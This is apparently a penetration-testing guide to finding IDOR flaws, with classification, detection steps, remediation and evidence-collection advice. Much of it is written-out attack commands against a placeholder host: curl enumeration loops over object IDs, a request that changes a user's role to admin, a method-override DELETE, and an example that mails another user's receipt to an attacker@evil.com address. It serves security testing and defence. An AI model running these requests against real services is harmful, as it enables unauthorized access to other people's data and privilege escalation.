# Insecure Direct Object Reference (IDOR) Testing

## Overview
IDOR vulnerabilities occur when an application exposes internal object references (database IDs, filenames, keys) in user-controllable parameters without proper authorization checks. Attackers manipulate these references to access or modify resources belonging to other users, enabling horizontal privilege escalation (accessing peer accounts) and vertical privilege escalation (accessing admin resources).

## Classification
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-284 (Improper Access Control)
- **OWASP:** A01:2021 - Broken Access Control
- **CVSS Base:** 4.3 - 8.6

## Detection Methodology

### 1. Identify Object References
Look for user-controllable identifiers in:
```
URL path:        /api/users/1234/profile
Query params:    /invoice?id=5678
POST body:       {"orderId": 9012, "userId": 3456}
Headers:         X-User-Id: 1234
Cookies:         user_id=1234
File paths:      /download?file=report_1234.pdf
GraphQL:         query { user(id: "1234") { email } }
```

Common identifier patterns:
- Sequential integers (1, 2, 3...)
- UUIDs (550e8400-e29b-41d4-a716-446655440000)
- Encoded values (Base64, hex)
- Hashed values (MD5, SHA1 of predictable input)
- Composite keys (user_1234_order_5678)
- Timestamps or date-based IDs

### 2. Horizontal Privilege Escalation
Access another user's resources by changing the object reference:

```bash
# Original request (user's own data)
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
  https://target.com/api/users/1001/profile

# IDOR test (another user's data)
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
  https://target.com/api/users/1002/profile

# If user B's profile is returned → IDOR confirmed
```

**Common test points:**
```bash
# User profile
GET /api/users/{id}

# Orders / transactions
GET /api/orders/{orderId}

# Messages / notifications
GET /api/messages/{messageId}

# Documents / files
GET /api/documents/{docId}/download

# Settings / configurations
PUT /api/users/{id}/settings
```

### 3. Vertical Privilege Escalation
Access admin or higher-privilege resources:

```bash
# Regular user accessing admin user profile
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  https://target.com/api/users/1/profile  # Admin is often ID 1

# Regular user accessing admin endpoints with object reference
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  https://target.com/api/admin/reports/latest

# Modifying role via IDOR
curl -s -X PUT -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  https://target.com/api/users/1001/role \
  -d '{"role": "admin"}'
```

### 4. Parameter Tampering Techniques

**Sequential ID enumeration:**
```bash
# Enumerate sequential IDs
for id in $(seq 1 100); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer TOKEN" \
    "https://target.com/api/invoices/$id")
  echo "ID: $id → HTTP $status"
done
```

**UUID prediction:**
```
UUIDv1 contains timestamp + MAC address → predictable if timing is known.
Collect UUIDs from your own account, extract pattern, predict others.
UUIDv4 (random) is not predictable — verify the app actually uses v4.
```

**Encoded ID tampering:**
```bash
echo -n "user_1002" | base64  # Decode/re-encode with target ID
curl -s "https://target.com/api/profile?ref=dXNlcl8xMDAy"
echo -n "1002" | md5sum       # If hash of sequential number → predictable
```

### 5. HTTP Method Variation
```bash
# GET may be protected but PUT/PATCH/DELETE may not be
curl -s -X GET -H "Auth: TOKEN_A" https://target.com/api/users/1002  # 403
curl -s -X PUT -H "Auth: TOKEN_A" https://target.com/api/users/1002 -d '{}'  # 200?

# Try method override
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" \
  -H "Auth: TOKEN_A" https://target.com/api/users/1002
```

### 6. Reference Manipulation in Non-Obvious Locations
```bash
# PDF/report generation
POST /api/generate-report
{"userId": 1002, "type": "financial"}

# Email/notification endpoints
POST /api/send-receipt
{"orderId": 5678, "email": "attacker@evil.com"}

# Export/download
GET /api/export?user=1002&format=csv

# Webhooks referencing other resources
POST /api/webhooks
{"event": "order.complete", "orderId": 5678}

# GraphQL
query { user(id: "1002") { email, ssn, address } }
mutation { deleteUser(id: "1002") { success } }
```

### 7. Bulk IDOR
```bash
POST /api/users/bulk  →  {"ids": [1001, 1002, 1003, 1004, 1005]}
GET /api/orders?userId=1002   # Search/filter with other user's ID
```

## Tool Usage
```bash
# Burp Suite Autorize extension
# 1. Configure low-privilege user's cookies
# 2. Browse as high-privilege user
# 3. Autorize replays each request with low-privilege cookies
# 4. Flags requests that succeed with wrong authorization

# Burp Intruder for ID enumeration
# Set payload position on the ID parameter
# Use Numbers payload type with sequential range

# OWASP ZAP Access Control Testing
# Configure users and access rules, then scan

# Custom enumeration script
for id in $(seq 1 500); do
  resp=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Bearer USER_TOKEN" \
    "https://target.com/api/documents/$id")
  code=$(echo "$resp" | tail -1)
  if [ "$code" = "200" ]; then
    echo "[ACCESSIBLE] Document ID: $id"
  fi
done

# Arjun - parameter discovery (find hidden ID params)
arjun -u https://target.com/api/endpoint -m GET
```

## Remediation
1. **Server-side authorization** -- check object ownership on every access, never rely on client-supplied user context alone
2. **Indirect references** -- map user-visible IDs to internal IDs server-side (reference maps per session)
3. **UUIDv4** -- use random UUIDs instead of sequential integers (defense in depth, not sole protection)
4. **Ownership validation** -- `WHERE id = :objectId AND owner_id = :currentUserId`
5. **Centralized access control** -- use middleware/decorators that enforce ownership checks consistently
6. **Rate limiting** -- limit enumeration attempts on object-referencing endpoints
7. **Audit logging** -- log and alert on access patterns indicating enumeration
8. **Avoid exposing internal IDs** -- use slugs, hashes, or opaque tokens where possible

## Evidence Collection
- Original request with legitimate object reference
- Tampered request with another user's object reference
- Both responses showing unauthorized data access
- User context proof (demonstrate requester identity vs resource owner)
- Number of accessible resources enumerated
- Data sensitivity of exposed resources
- Impact assessment (PII exposure, financial data, administrative access)
- Affected endpoints and HTTP methods
